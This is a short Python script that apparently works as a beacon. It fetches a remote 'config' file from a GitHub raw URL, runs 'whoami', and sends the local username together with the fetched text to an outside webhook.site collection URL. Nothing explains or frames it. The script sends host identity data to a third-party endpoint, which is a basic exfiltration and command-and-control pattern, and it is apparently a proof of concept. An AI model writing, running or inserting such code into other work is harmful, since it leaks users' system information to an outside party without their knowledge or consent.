import subprocess
import requests




cmd = requests.get("https://raw.githubusercontent.com/RanushMithila/testas/main/config")
result = subprocess.run(["whoami"], capture_output=True, text=True)
print(result.stdout)
url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print=" + cmd.text
res = requests.get(url)

